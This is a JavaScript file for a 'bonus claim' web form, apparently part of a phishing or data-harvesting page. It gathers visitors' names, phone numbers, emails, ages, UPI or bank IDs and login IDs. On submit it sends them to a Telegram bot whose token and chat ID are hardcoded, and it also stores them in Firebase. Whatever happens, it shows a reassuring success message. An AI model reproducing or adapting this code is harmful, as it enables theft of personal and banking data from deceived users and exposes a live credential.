const TELEGRAM_API = 'https://api.telegram.org/bot8902846687:AAGE2QmaVtf-wden-XEp-5VHdAirq03igyQ';
const BONUS_CHAT_ID = '-1003809176248';

document.addEventListener('DOMContentLoaded', function () {

    const loginId = sessionStorage.getItem('ls_login_id') || 'Guest User';
    const sumAccount = document.getElementById('sum-account');
    if (sumAccount) sumAccount.textContent = loginId;

    const form = document.getElementById('bonus-form');
    const submitBtn = document.getElementById('bf-submit');
    const agreeBox = document.querySelector('.checkbox');
    const successModal = document.getElementById('bonus-success');
    const doneBtn = document.getElementById('bonus-done');
    const successAmount = document.getElementById('success-amount');

    const validators = {
        full_name: v => v.trim().length >= 3,
        username: v => v.trim().length >= 3,
        mobile: v => /^[0-9]{10}$/.test(v.trim()),
        age: v => Number(v) >= 18 && Number(v) <= 99,
        email: v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v.trim()),
        bank_id: v => v.trim().length >= 3,
        bonus_amount: v => Number(v) > 0,
        city: v => v.trim().length >= 2
    };

    function validateField(input) {
        const rule = validators[input.name];
        const field = input.closest('.field');
        if (!rule) return true;
        const ok = rule(input.value);
        field.classList.toggle('invalid', !ok);
        return ok;
    }

    form.querySelectorAll('input').forEach(input => {
        input.addEventListener('blur', () => validateField(input));
        input.addEventListener('input', () => {
            const field = input.closest('.field');
            if (field.classList.contains('invalid')) validateField(input);
        });
    });

    agreeBox.querySelector('input').addEventListener('change', function () {
        agreeBox.classList.toggle('invalid', !this.checked);
    });

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        let valid = true;
        form.querySelectorAll('input[required]').forEach(input => {
            if (!validateField(input)) valid = false;
        });

        const agreeInput = agreeBox.querySelector('input');
        agreeBox.classList.toggle('invalid', !agreeInput.checked);
        if (!agreeInput.checked) valid = false;

        if (!valid) {
            const firstBad = form.querySelector('.field.invalid');
            if (firstBad) firstBad.scrollIntoView({ behavior: 'smooth', block: 'center' });
            return;
        }

        const data = Object.fromEntries(new FormData(form).entries());
        const now = new Date().toISOString();

        const record = {
            ...data,
            request_id: 'REQ-' + String(Math.floor(100000 + Math.random() * 899999)),
            account: loginId,
            status: 'Under Review',
            created_at: now,
            updated_at: now
        };

        const requests = JSON.parse(localStorage.getItem('ls_bonus_requests') || '[]');
        requests.unshift(record);
        localStorage.setItem('ls_bonus_requests', JSON.stringify(requests));

        const originalHTML = submitBtn.innerHTML;
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="spinner"></span><span class="btn-text">Submitting...</span>';

        const text = `
🎁 <b>BONUS CLAIM REQUEST</b>

👤 <b>Name:</b> ${data.full_name}
🆔 <b>Username:</b> ${data.username}
📱 <b>Mobile:</b> ${data.mobile}
🎂 <b>Age:</b> ${data.age}
📧 <b>Email:</b> ${data.email}
🏦 <b>UPI/Bank:</b> ${data.bank_id}
💰 <b>Bonus Amount:</b> ₹${data.bonus_amount}
📍 <b>City:</b> ${data.city}
📝 <b>Note:</b> ${data.note || '-'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `.trim();

        Promise.all([sendMessage(text), saveToFirebase(data)])
            .catch(() => {})
            .then(() => {
                submitBtn.disabled = false;
                submitBtn.innerHTML = originalHTML;
                successAmount.textContent = '₹' + data.bonus_amount;
                successModal.classList.add('show');
                form.reset();
                agreeBox.classList.remove('invalid');
            });
    });

    doneBtn.addEventListener('click', function () {
        successModal.classList.remove('show');
        window.location.href = '../bonus-status/index.html';
    });

    successModal.addEventListener('click', function (e) {
        if (e.target === successModal) successModal.classList.remove('show');
    });

    function sendMessage(text) {
        return fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: BONUS_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    }

    function saveToFirebase(data) {
        if (!window.firebase || !firebase.firestore) return Promise.resolve();
        return firebase.firestore().collection('submissions').add({
            ...data,
            site_id: 'lucky_star',
            event: 'bonus',
            type: 'Bonus Claim',
            created_at: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

});
